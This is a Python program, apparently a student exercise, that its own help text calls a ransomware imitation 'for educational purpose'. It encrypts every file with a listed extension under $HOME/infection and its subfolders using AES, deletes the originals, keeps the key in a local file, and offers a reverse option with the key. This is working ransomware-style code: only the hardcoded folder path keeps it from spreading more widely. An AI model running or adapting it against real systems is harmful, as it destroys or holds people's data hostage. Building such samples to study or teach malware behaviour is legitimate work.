import argparse
import os
import pyAesCrypt
import secrets

program_version = 'Version 1.0'
supported_extensions_path = "./supported_extensions"
infection_path = f"{os.getenv('HOME')}/infection/"
extensions = ".ft"
key_file_path = "./encryption_key.key"
buffer_size = 64 * 1024

class Stockholm:
    isSilent = False
    supported_extensions = []
    key = None
    folders_path = []

    def __init__(self, args):
        if (args.silent == True):
            self.isSilent = True;
        try:
            file = open(supported_extensions_path, "r")
            extensions = file.read()
            self.supported_extensions = extensions.replace(' ', '').split('\n')
        except:
            print("Extensions file not found!")
            exit(1);
    
    def decrypt(self):
        try:
            for folder in self.folders_path:
                for file in os.listdir(folder):
                    file_path = os.path.join(folder, file)
                    if (not file_path.endswith(tuple(".ft"))):
                        continue ;
                    if (not self.isSilent):
                        print("Decrypting,", file_path)
                    pyAesCrypt.decryptFile(file_path, file_path[:-3], self.key, buffer_size)
                    os.remove(file_path)
        except:
            print("Incorrect key")

    def reverse_infection(self, key):
        self.key = key
        self.find_folder_path()
        self.decrypt()
        return ;
    
    def generate_key(self):
        file = open(key_file_path, 'a+');
        file.seek(0)
        old_key = file.read();
        file.seek(0)
        if (old_key == ""):
            key = secrets.token_hex(16)
            file.write(key)
            return key
        return old_key
    
    def find_folder_path(self):
        self.folders_path.append(os.path.join(infection_path))
        for root, dirs, files in os.walk(os.path.expanduser(infection_path)):
            for dir in dirs:
                self.folders_path.append(os.path.join(root, dir))

    def encrypt(self):
        for folder in self.folders_path:
            for file in os.listdir(folder):
                file_path = os.path.join(folder, file)
                if (not file_path.endswith(tuple(self.supported_extensions))):
                    continue ;
                if (not self.isSilent):
                    print("Encrypting,", file_path)
                pyAesCrypt.encryptFile(file_path, file_path + ".ft", self.key, buffer_size)
                os.remove(file_path)


    def infect(self):
        self.key = self.generate_key()
        self.find_folder_path()
        self.encrypt()
        return ;



def init_args():
    parser = argparse.ArgumentParser(
                    prog='stockholm',
                    description='A program that imitate a ransomware, created only for educationnal purpose',
                    epilog='Made with <3 by hrecolet')
    parser.add_argument('-v', '--version', action='store_true')
    parser.add_argument('-s', '--silent', action='store_true')
    parser.add_argument('-r', '--reverse', type=str)
    args = parser.parse_args()
    return args

def exec():
    args = init_args()
    if (args.version):
        print(program_version)
        return ;
    
    stockholm = Stockholm(args);
    if (args.reverse):
        stockholm.reverse_infection(args.reverse)
    else:
        stockholm.infect()
        

if __name__ == '__main__':
    exec()